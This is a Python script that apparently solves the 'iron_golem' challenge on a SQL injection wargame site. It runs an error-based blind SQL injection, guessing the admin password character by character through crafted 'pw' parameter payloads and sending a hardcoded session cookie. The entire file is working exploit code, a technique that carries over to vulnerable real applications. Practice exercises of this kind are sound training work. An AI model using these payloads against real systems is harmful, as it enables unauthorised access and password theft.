import requests

url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw="
session = {'PHPSESSID':'62ca8t63qo1qqabri22inm6cvr'}
payload2 = ""


for i in range(1,33):
    for j in range(48,123):
        payload="' or id='admin' and if(ord(substr(pw,"+str(i)+",1))="+str(j)+",1,(select 1 union select 2))%23"
        #print(str(i)+" payload = "+url+payload)
        
        request = requests.post(url+payload, cookies=session)
        if "select" in request.text:
            flag = 0
            break
        else:
            flag = 1
            continue
    payload2 = payload2 + chr(j)
    print(payload2)
print("DONE!!"+payload2)

